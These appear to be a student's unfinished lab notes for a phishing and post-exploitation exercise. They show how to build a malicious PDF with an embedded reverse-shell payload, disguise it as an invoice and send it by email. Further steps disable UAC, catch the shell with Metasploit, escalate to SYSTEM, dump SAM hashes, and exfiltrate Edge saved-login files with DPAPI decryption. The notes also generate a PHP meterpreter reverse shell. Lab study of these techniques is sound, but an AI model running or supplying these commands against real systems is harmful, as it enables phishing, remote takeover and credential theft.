# Skip reading this file as it is still not ready (will upd later)
Download vulnerable Adobe Reader https://archive.org/download/AdobeReaderArchives6x11x/Reader%209.0/ENU/AdbeRdr90_en_US_Std.exe

Install in Windows, and then Open the App >> Preferences>> Trust Manager>> Disable the auto update

In Kali
Setoolkit>> 1 Social Eng>> 1 Spear Fishing Attack>> 2 Create FileFormat Payload>> 13 Adobe PFD Embedded EXE>> 2 Use BuiltIn>> 5 Windows Reverse TCP Shell

Use the mahcine ip and 4444 as port

Then copy the payload to you workplace folder Desktop/226_part3

mkdir ~/Desktop/226_part3/ && sudo cp /root/.set/template.pdf /home/kaled/Desktop/226_part3/invoice.pdf
sudo cp /root/.set/template.rc /home/kaled/Desktop/226_part3/template.rc

Send the pdf as email attachment

Metasploit>>
sudo msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 4444; exploit"



In windows 
Prepare for this work:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
shutdown /r /t 0

After restart, in firewall exclude exe and pdf
open the local email sever download the pdf, open it in the outdated acrobat reader, then open it it will ask to save the payload `form` save it int e document file (this is the default of the payload or need to change it)


Find fresh x64 explorer.exe PID owned by current user
ps | grep explorer
or 
pgrep explorer

migrate <PID>
getsystem
getuid    

load kiwi
lsa_dump_sam


Get the Edge saved login credentials>>
cd "C:\Users\kaled\AppData\Local\Microsoft\Edge\User Data\Default"
download "Login Data" /home/kaled/Desktop/226_part3/
cd "C:\Users\kaled\AppData\Local\Microsoft\Edge\User Data"
download "Local State" /home/kaled/Desktop/226_part3/

Open "Local State" in mousepad and search for "os_crypt" to see the encryoted key.
dir "C:\Users\kaled\AppData\Roaming\Microsoft\Protect"
The saved credentials in Edge >> get "Login Data">> get the key in "Local State">> get DPAPI Master Key>> Get the Active user password

Create PHP payload>>
cd Desktop
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.8.10 lport=5555 -f raw -o shell.php
sudo msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 5555; exploit"


